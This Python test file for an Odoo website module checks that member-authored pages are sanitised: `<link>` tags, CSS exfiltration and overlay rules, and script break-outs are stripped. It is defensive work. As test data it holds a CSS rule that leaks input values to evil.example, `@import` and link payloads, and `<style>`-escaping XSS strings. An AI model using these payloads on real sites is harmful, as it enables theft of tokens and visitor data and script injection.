# -*- coding: utf-8 -*-
# Copyright © Bruce Perens K6BP.
# SPDX-License-Identifier: AGPL-3.0-or-later
"""`<link>` and `<style>` in member-authored pages: `website.page._sanitize_user_arch`.

Tests [@ANCHOR: user_websites:page_arch_style_link_filter]
[@ANCHOR: test_user_arch_style_link_filter] lives here.

A member `<style>` can read any value in the page through attribute selectors plus `url()`
backgrounds (the CSRF token field, the viewer's name) and a `position: fixed` rule covers the
site's chrome; a member `<link>` makes every visitor's browser fetch from a host the member
chose. `<link>` is removed; `<style>` is rebuilt from zero_sudo's stylesheet filter. Neither
strikes the member: a linked web font or a fixed header is not an attack.
"""
import uuid

from lxml import etree

from odoo.tests.common import tagged
from odoo.addons.zero_sudo.tests.common import HamsHttpCase
from odoo.addons.zero_sudo.tests.test_css_sanitizer import STYLE_ATTR_HOSTILE

EXFIL = 'input[value^="a"]{background:url(https://evil.example/a)}'


def _tags(arch, name):
    root = etree.fromstring(f"<root>{arch}</root>", etree.XMLParser(recover=True))
    return [e for e in root.iter() if isinstance(e.tag, str) and e.tag.rpartition("}")[2].lower() == name]


@tagged("post_install", "-at_install")
class TestUserArchStyleAndLink(HamsHttpCase):
    # Tests [@ANCHOR: test_user_arch_style_link_filter]
    # Tests [@ANCHOR: user_websites:page_arch_style_link_filter]

    def sanitize(self, arch):
        return self.env["website.page"]._sanitize_user_arch(arch)

    def test_01_link_is_removed_whatever_its_rel_and_text_is_kept(self):
        for rel in ("stylesheet", "preload", "prefetch", "icon", "canonical", "dns-prefetch", "STYLESHEET"):
            with self.subTest(rel=rel):
                cleaned, modified = self.sanitize(
                    f'<div>a<link rel="{rel}" href="https://evil.example/x.css"/>tail</div>'
                )
                self.assertEqual(_tags(cleaned, "link"), [])
                self.assertNotIn("evil.example", cleaned)
                self.assertIn("atail", cleaned)
                self.assertFalse(modified, "a link is removed without counting as an attack")

    def test_02_link_in_other_spellings_is_removed(self):
        for source in (
            '<LINK rel="stylesheet" href="https://evil.example/x.css"/>',
            '<link rel="stylesheet" href="https://evil.example/x.css">',
            '<x:link xmlns:x="http://www.w3.org/1999/xhtml" rel="stylesheet" href="https://evil.example/x.css"/>',
            '<div><link/><p><link rel="stylesheet" href="//evil.example/x.css"/></p></div>',
        ):
            with self.subTest(source=source):
                cleaned, _ = self.sanitize(source)
                self.assertEqual(_tags(cleaned, "link"), [])
                self.assertNotIn("evil.example", cleaned)

    def test_03_style_exfiltration_and_overlay_rules_are_removed_not_the_whole_style(self):
        cleaned, modified = self.sanitize(
            f"<div><style>p{{color:red}} {EXFIL} .o{{position:fixed}} .k{{margin:0}}</style>x</div>"
        )
        styles = _tags(cleaned, "style")
        self.assertEqual(len(styles), 1)
        css = styles[0].text
        self.assertEqual(css, "p{color:red}\n.k{margin:0}")
        self.assertNotIn("evil.example", cleaned)
        self.assertNotIn("fixed", cleaned)
        self.assertFalse(modified)

    def test_04_style_with_nothing_left_is_removed(self):
        for body in ("@import url(https://evil.example/x.css);", EXFIL, "", "/* nothing */"):
            with self.subTest(body=body):
                cleaned, _ = self.sanitize(f"<div><style>{body}</style>x</div>")
                self.assertEqual(_tags(cleaned, "style"), [])
                self.assertNotIn("evil.example", cleaned)

    def test_05_style_children_attributes_and_markup_cannot_survive(self):
        cleaned, _ = self.sanitize(
            "<div><style type='text/css' onload='window.__xss=1' t-esc='x' media='print'>"
            "p{color:red}<b onclick='x'>y</b></style></div>"
        )
        style = _tags(cleaned, "style")[0]
        self.assertEqual(dict(style.attrib), {"media": "print"})
        self.assertEqual(len(style), 0)
        for source in (
            "<style>p{content:'&lt;/style&gt;&lt;script&gt;window.__xss=1&lt;/script&gt;'}</style>",
            "<style><![CDATA[</style><script>window.__xss=1</script>]]></style>",
            "<style media='x\"onload=\"y'>p{color:red}</style>",
        ):
            with self.subTest(source=source):
                cleaned, _ = self.sanitize(f"<div>{source}</div>")
                self.assertEqual(_tags(cleaned, "script"), [])
                self.assertNotIn("<script", cleaned.lower())
                self.assertNotIn("window.__xss", "".join(s.text or "" for s in _tags(cleaned, "style")))

    def test_06_sanitizing_twice_changes_nothing(self):
        source = (
            f"<div><style media='screen'>p{{color:red}} {EXFIL} @media (max-width:5px){{p{{margin:0}}}}</style>"
            "<link rel='stylesheet' href='https://evil.example/x.css'/>x</div>"
        )
        once, _ = self.sanitize(source)
        twice, modified = self.sanitize(once)
        self.assertEqual(twice, once)
        self.assertFalse(modified)

    def test_07_ordinary_member_stylesheet_survives(self):
        css = "body{font-family:Georgia,serif;color:#222}\n.card > h2{border-bottom:1px solid #ccc}"
        cleaned, modified = self.sanitize(f"<div><style>{css}</style><p class='card'>x</p></div>")
        self.assertFalse(modified)
        self.assertEqual(_tags(cleaned, "style")[0].text, css)

    def test_08_svg_style_still_goes_through_the_svg_allowlist(self):
        cleaned, modified = self.sanitize(
            "<div><svg viewBox='0 0 9 9'><style>@import url(https://evil.example/a.css)</style>"
            "<rect width='3' height='3'/></svg></div>"
        )
        self.assertTrue(modified, "a hostile svg still counts as an injection attempt")
        self.assertEqual(_tags(cleaned, "style"), [])


@tagged("post_install", "-at_install")
class TestUserArchStyleAttribute(HamsHttpCase):
    # Tests [@ANCHOR: user_websites:page_arch_style_attribute_filter]
    # [@ANCHOR: test_user_arch_style_attribute_filter] lives here.

    def sanitize(self, arch):
        return self.env["website.page"]._sanitize_user_arch(arch)

    def _styles(self, arch):
        root = etree.fromstring(f"<root>{arch}</root>", etree.XMLParser(recover=True))
        return [e.get("style") for e in root.iter() if isinstance(e.tag, str) and "style" in e.attrib]

    def test_01_every_bypass_is_removed_from_the_attribute(self):
        for name, value in STYLE_ATTR_HOSTILE:
            with self.subTest(name=name):
                escaped = value.replace("&", "&amp;").replace('"', "&quot;").replace("<", "&lt;")
                cleaned, modified = self.sanitize(f'<div><p style="{escaped}">x</p></div>')
                self.assertEqual(self._styles(cleaned), [])
                self.assertNotIn("evil.example", cleaned)
                self.assertNotRegex(cleaned.lower(), r"fixed|sticky|expression|binding|behavior")
                self.assertFalse(modified, "a style attribute is filtered without a strike")

    def test_02_harmless_style_survives_and_hostile_part_goes(self):
        cleaned, _ = self.sanitize(
            '<div style="color:red;margin:0 auto"><p STYLE="COLOR:blue;'
            'background:url(https://evil.example/a);position:fixed">x</p></div>'
        )
        self.assertEqual(self._styles(cleaned), ["color:red;margin:0 auto", "color:blue"])

    def test_03_malformed_attribute_is_dropped_whole_and_empty_one_removed(self):
        cleaned, _ = self.sanitize(
            '<div><p style="color:red;/* open">a</p><p style="">b</p><p style="  ">c</p>'
            '<p style="position:fixed">d</p></div>'
        )
        self.assertEqual(self._styles(cleaned), [])
        self.assertNotIn("style=", cleaned)
        self.assertIn(">a<", cleaned)

    def test_04_every_element_and_nesting_is_covered(self):
        cleaned, _ = self.sanitize(
            '<t t-name="x"><section style="position:sticky"><ul><li style="list-style-image:url(https://evil.example/b)">'
            '<span style="color:red">x</span></li></ul></section><img src="a.png" style="background:url(//evil.example/a)"/></t>'
        )
        self.assertEqual(self._styles(cleaned), ["color:red"])
        self.assertNotIn("evil.example", cleaned)

    def test_05_style_attribute_inside_svg_still_uses_the_svg_filter(self):
        cleaned, _ = self.sanitize(
            "<div><svg viewBox='0 0 9 9'><rect width='3' height='3' style='fill:red;background:url(https://evil.example/a)'/></svg></div>"
        )
        self.assertNotIn("evil.example", cleaned)

    def test_06_sanitizing_twice_changes_nothing(self):
        once, _ = self.sanitize(
            '<div style="COLOR:red;background:url(https://evil.example/a)"><p style="position:fixed">x</p></div>'
        )
        twice, modified = self.sanitize(once)
        self.assertEqual(twice, once)
        self.assertFalse(modified)


@tagged("post_install", "-at_install")
class TestMemberPageStyleLinkOnSavePath(HamsHttpCase):
    """The member's own create/write and the public page that comes out."""

    # Tests [@ANCHOR: test_user_arch_style_link_filter]

    def setUp(self):
        super().setUp()
        unique = uuid.uuid4().hex[:8]
        self.member = self.env["res.users"].create(
            {
                "name": f"Style Member {unique}",
                "login": f"stylemember_{unique}",
                "password": "stylemember",
                "email": f"stylemember_{unique}@example.com",
                "website_slug": f"stylemember-{unique}",
                "group_ids": [
                    (
                        6,
                        0,
                        [
                            self.env.ref("base.group_portal").id,
                            self.env.ref("user_websites.group_user_websites_user").id,
                        ],
                    )
                ],
            }
        )

    def _page(self, arch):
        return self.env["website.page"].with_user(self.member).create(
            {
                "url": f"/{self.member.website_slug}/styled",
                "name": "styled",
                "type": "qweb",
                "owner_user_id": self.member.id,
                "website_published": True,
                "arch": arch,
            }
        )

    def test_01_create_and_write_store_the_filtered_arch_without_a_strike(self):
        reports = self.env["content.violation.report"]
        before = reports.search_count([("content_owner_id", "=", self.member.id)])
        arch = (
            "<t name='Styled'><div><link rel='stylesheet' href='https://evil.example/x.css'/>"
            f"<style>p{{color:red}} {EXFIL} .o{{position:fixed}}</style><p>hello</p></div></t>"
        )
        page = self._page(arch)
        self.assertNotIn("evil.example", page.arch)
        self.assertNotIn("fixed", page.arch)
        self.assertIn("p{color:red}", page.arch)
        self.assertEqual(_tags(page.arch, "link"), [])
        page.with_user(self.member).write({"arch": arch})
        self.assertNotIn("evil.example", page.arch)
        self.assertEqual(reports.search_count([("content_owner_id", "=", self.member.id)]), before)

    def test_02_public_page_serves_no_link_and_no_exfiltration_rule(self):
        self._page(
            "<t name='Styled'><div><link rel='stylesheet' href='https://evil.example/x.css'/>"
            f"<style>p{{color:red}} {EXFIL}</style><p id='marker-styled'>hello</p></div></t>"
        )
        self.env.flush_all()
        response = self.url_open(f"/{self.member.website_slug}/styled")
        self.assertEqual(response.status_code, 200)
        self.assertIn("marker-styled", response.text)
        self.assertNotIn("evil.example", response.text)

    def test_03_style_attribute_is_filtered_on_create_write_and_public_page(self):
        reports = self.env["content.violation.report"]
        before = reports.search_count([("content_owner_id", "=", self.member.id)])
        arch = (
            "<t name='Styled'><div style='color:red;position:fixed;inset:0'>"
            "<p id='marker-attr' style=\"background:url(https://evil.example/px);margin:0\">hello</p>"
            "<p style='position:-webkit-sticky'>y</p></div></t>"
        )
        page = self._page(arch)
        for stored in (page.arch,):
            self.assertNotIn("evil.example", stored)
            self.assertNotIn("fixed", stored)
            self.assertNotIn("sticky", stored)
            self.assertIn("color:red", stored)
            self.assertIn("margin:0", stored)
        page.with_user(self.member).write({"arch": arch})
        self.assertNotIn("evil.example", page.arch)
        self.assertNotIn("fixed", page.arch)
        self.assertEqual(reports.search_count([("content_owner_id", "=", self.member.id)]), before)
        self.env.flush_all()
        response = self.url_open(f"/{self.member.website_slug}/styled")
        self.assertEqual(response.status_code, 200)
        self.assertIn("marker-attr", response.text)
        self.assertNotIn("evil.example/px", response.text)
